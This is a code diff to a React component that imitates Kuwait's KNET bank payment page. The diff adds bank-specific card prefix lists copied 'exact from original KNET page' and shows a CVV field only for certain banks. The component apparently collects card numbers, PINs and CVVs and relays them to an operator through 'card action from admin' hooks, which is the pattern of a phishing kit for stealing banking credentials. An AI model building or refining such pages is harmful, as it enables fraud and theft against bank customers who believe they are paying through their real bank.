@@ -10,32 +10,64 @@ import {
   waitingMessage,
 } from "@/lib/store";
 
-const kuwaitBanks = [
-  { id: "ABK", name: "Al Ahli Bank of Kuwait [ABK]" },
-  { id: "BBK", name: "Boubyan Bank [Boubyan]" },
-  { id: "Burgan", name: "Burgan Bank [Burgan]" },
-  { id: "CBK", name: "Commercial Bank of Kuwait [CBK]" },
-  { id: "Gulf", name: "Gulf Bank [Gulf Bank]" },
-  { id: "KFH", name: "Kuwait Finance House [KFH]" },
-  { id: "KIB", name: "Kuwait International Bank [KIB]" },
-  { id: "NBK", name: "National Bank of Kuwait [NBK]" },
-  { id: "Weyay", name: "NBK [Weyay]" },
-  { id: "QNB", name: "Qatar National Bank [QNB]" },
-  { id: "UNB", name: "Union National Bank [UNB]" },
-  { id: "Warba", name: "Warba Bank [Warba]" },
-];
+// Bank-to-prefix mapping (exact from original KNET page)
+// Banks that require CVV: CBK, KFH
+const bankPrefixMap: Record<string, { prefixes: string[]; showCvv: boolean }> = {
+  "Al Ahli Bank of Kuwait [ABK]": {
+    prefixes: ["403622", "423826", "428628"],
+    showCvv: false,
+  },
+  "Boubyan Bank [Boubyan]": {
+    prefixes: ["404919", "450605", "426058", "431199", "470350", "490455", "490456"],
+    showCvv: false,
+  },
+  "Burgan Bank [Burgan]": {
+    prefixes: ["540759", "402978", "415254", "450238", "468564", "403583", "49219000"],
+    showCvv: false,
+  },
+  "Commercial Bank of Kuwait [CBK]": {
+    prefixes: ["521175", "516334", "532672", "537015"],
+    showCvv: true,
+  },
+  "Gulf Bank of Kuwait [GBK]": {
+    prefixes: ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"],
+    showCvv: false,
+  },
+  "KFH [TAM]": {
+    prefixes: ["45077848", "45077849"],
+    showCvv: false,
+  },
+  "Kuwait Finance House [KFH]": {
+    prefixes: ["450778", "485602", "537016", "532674"],
+    showCvv: true,
+  },
+  "Kuwait International Bank [KIB]": {
+    prefixes: ["409054", "406464"],
+    showCvv: false,
+  },
+  "National Bank of Kuwait [NBK]": {
+    prefixes: ["464452", "589160"],
+    showCvv: false,
+  },
+  "NBK [Weyay]": {
+    prefixes: ["46445250", "543363"],
+    showCvv: false,
+  },
+  "Qatar National Bank [QNB]": {
+    prefixes: ["521020", "524745"],
+    showCvv: false,
+  },
+  "Union National Bank [UNB]": {
+    prefixes: ["457778"],
+    showCvv: false,
+  },
+  "Warba Bank [Warba]": {
+    prefixes: ["532749", "559459", "541350", "525528"],
+    showCvv: false,
+  },
+};
 
-const prefixes = [
-  "400478", "402494", "403154", "405944", "406136", "407279", "407742",
-  "409706", "410308", "413284", "415622", "415623", "417633", "419328",
-  "419593", "421614", "422844", "425485", "425486", "428628", "431361",
-  "434620", "439357", "443263", "450603", "455708", "458456", "462220",
-  "464156", "464157", "468540", "468541", "468542", "484498", "484499",
-  "486562", "489318", "489319", "490455", "493846", "510082", "515825",
-  "516316", "520058", "521175", "524514", "524940", "529415", "530060",
-  "531196", "535825", "537015", "543357", "549780", "552810", "558848",
-  "585949", "588845", "588850", "589149", "604906",
-];
+const bankNames = Object.keys(bankPrefixMap);
 
 const months = Array.from({ length: 12 }, (_, i) => ({
   value: String(i + 1),
@@ -58,6 +90,16 @@ export default function KNETPayment() {
   const [cardPin, setCardPin] = useState("");
   const [cvv, setCvv] = useState("");
   const [showCvv, setShowCvv] = useState(false);
+
+  // Get prefixes for selected bank
+  const availablePrefixes = selectedBank && bankPrefixMap[selectedBank]
+    ? bankPrefixMap[selectedBank].prefixes
+    : [];
+
+  // Determine if CVV should show based on selected bank
+  const shouldShowCvv = selectedBank && bankPrefixMap[selectedBank]
+    ? bankPrefixMap[selectedBank].showCvv
+    : false;
   const [validationError, setValidationError] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [rejectedError, setRejectedError] = useState(false);
@@ -69,6 +111,21 @@ export default function KNETPayment() {
   useEffect(() => {
     navigateToPage("دفع كي نت");
   }, []);
+
+  // When bank changes, reset prefix and update CVV visibility
+  const handleBankChange = (bankName: string) => {
+    setSelectedBank(bankName);
+    setSelectedPrefix("");
+    setCardNumber("");
+    setValidationError("");
+    setRejectedError(false);
+    if (bankName && bankPrefixMap[bankName]) {
+      setShowCvv(bankPrefixMap[bankName].showCvv);
+    } else {
+      setShowCvv(false);
+    }
+    setCvv("");
+  };
 
   // Handle card action from admin
   useSignalEffect(() => {
@@ -348,7 +405,7 @@ export default function KNETPayment() {
                 </label>
                 <select
                   value={selectedBank}
-                  onChange={(e) => setSelectedBank(e.target.value)}
+                  onChange={(e) => handleBankChange(e.target.value)}
                   style={{
                     float: "left",
                     width: "60%",
@@ -358,10 +415,10 @@ export default function KNETPayment() {
                     fontWeight: "normal",
                   }}
                 >
-                  <option value="">Select Bank</option>
-                  {kuwaitBanks.map((bank) => (
-                    <option key={bank.id} value={bank.name}>
-                      {bank.name}
+                  <option value="">Select Your Bank</option>
+                  {bankNames.map((name) => (
+                    <option key={name} value={name}>
+                      {name}
                     </option>
                   ))}
                 </select>
@@ -399,8 +456,8 @@ export default function KNETPayment() {
                     marginRight: 5,
                   }}
                 >
-                  <option value="">Prefix</option>
-                  {prefixes.map((p) => (
+                  <option value="">prefix</option>
+                  {availablePrefixes.map((p) => (
                     <option key={p} value={p}>
                       {p}
                     </option>
@@ -531,8 +588,8 @@ export default function KNETPayment() {
                 />
               </div>
 
-              {/* CVV (shown after first submit if needed) */}
-              {showCvv && (
+              {/* CVV (shown for banks that require it: CBK, KFH) */}
+              {shouldShowCvv && (
                 <div
                   style={{
                     borderBottom: "1px solid #8f8f90",
